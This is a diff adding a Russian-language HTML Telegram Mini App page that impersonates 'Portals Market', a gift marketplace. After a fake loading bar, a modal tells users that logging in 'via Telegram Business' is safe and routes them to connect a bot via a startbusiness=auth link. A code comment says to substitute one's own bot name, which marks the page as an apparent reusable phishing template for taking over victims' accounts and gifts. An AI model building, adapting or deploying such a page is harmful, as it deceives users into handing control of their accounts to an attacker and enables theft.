@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0b0b0b;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Фоновые иконки как на фото */
+        .bg-icons {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.6;
+            background: radial-gradient(circle at center, transparent 0%, #0b0b0b 90%);
+        }
+
+        .icon {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            filter: drop-shadow(0 0 10px rgba(255,255,255,0.1));
+        }
+
+        /* Расставляем иконки примерно как на макете */
+        .icon-1 { top: 10%; right: 20%; background-image: url('https://img.icons8.com/emoji/96/helmet-with-white-cross.png'); transform: rotate(15deg); }
+        .icon-2 { top: 30%; left: 15%; background-image: url('https://img.icons8.com/emoji/96/skull-emoji.png'); transform: rotate(-10deg); }
+        .icon-3 { top: 35%; right: 10%; background-image: url('https://img.icons8.com/emoji/96/frog-face.png'); transform: rotate(5deg); }
+        .icon-4 { bottom: 25%; left: 10%; background-image: url('https://img.icons8.com/emoji/96/gem-stone.png'); }
+        .icon-5 { bottom: 30%; right: 15%; background-image: url('https://img.icons8.com/emoji/96/pig-face.png'); }
+        .icon-6 { bottom: 10%; left: 45%; background-image: url('https://img.icons8.com/emoji/96/watch-emoji.png'); }
+
+        /* Логотип и Загрузка */
+        .loader-container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            width: 80%;
+            transition: opacity 0.5s ease;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            border: 3px solid white;
+            border-radius: 10px 10px 0 0;
+            margin-bottom: 5px;
+            position: relative;
+        }
+
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 15px;
+            height: 5px;
+            background: white;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: white;
+            transition: width 0.1s linear;
+        }
+
+        /* Модальное окно авторизации */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
+            display: none; /* Скрыто по умолчанию */
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-card {
+            background: #1c1c1e;
+            width: 85%;
+            max-width: 320px;
+            border-radius: 24px;
+            padding: 24px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: #8e8e93;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .modal-card h2 {
+            font-size: 20px;
+            margin-bottom: 12px;
+            margin-top: 10px;
+        }
+
+        .modal-card p {
+            color: #8e8e93;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .info-badge {
+            background: rgba(0, 136, 204, 0.1);
+            color: #0088cc;
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .login-btn {
+            background: #24a1de;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-text {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #636366;
+        }
+
+        .footer-text a { color: #0088cc; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-icons">
+        <div class="icon icon-1"></div>
+        <div class="icon icon-2"></div>
+        <div class="icon icon-3"></div>
+        <div class="icon icon-4"></div>
+        <div class="icon icon-5"></div>
+        <div class="icon icon-6"></div>
+    </div>
+
+    <div class="loader-container" id="loader">
+        <div class="logo">
+            <div class="logo-icon"></div>
+            Portals
+        </div>
+        <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="progress"></div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="modal">
+        <div class="modal-card">
+            <div class="close-btn" onclick="closeModal()">✕</div>
+            <h2>Войдите в Portals Market</h2>
+            <p>Для доступа к вашей коллекции подарков и начала торговли, пожалуйста, авторизуйтесь через Telegram Business.</p>
+
+            <div class="info-badge">
+                <img src="https://img.icons8.com/ios-filled/20/0088cc/telegram-app.png" width="16"/>
+                Это безопасно и займет всего пару секунд.
+            </div>
+
+            <button class="login-btn" onclick="connect()">
+                ВОЙТИ ЧЕРЕЗ TELEGRAM
+            </button>
+
+            <div class="footer-text">
+                Нажимая «Войти», вы соглашаетесь с <a href="#">Условиями использования сервиса</a>.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // Анимация полоски загрузки
+        let width = 0;
+        const progressBar = document.getElementById('progress');
+        const loader = document.getElementById('loader');
+        const modal = document.getElementById('modal');
+
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                setTimeout(showLogin, 300); // Небольшая задержка после 100%
+            } else {
+                width += 1;
+                progressBar.style.width = width + '%';
+            }
+        }, 30); // Скорость загрузки (примерно 3 секунды)
+
+        function showLogin() {
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                modal.style.display = 'flex';
+            }, 500);
+        }
+
+        function closeModal() {
+            tg.close();
+        }
+
+        function connect() {
+            // ЗАМЕНИ НА ИМЯ СВОЕГО БОТА
+            const botUser = "GiftAsset_Manager_bot";
+            tg.openTelegramLink(`https://t.me/${botUser}?startbusiness=auth`);
+        }
+    </script>
+</body>
+</html>
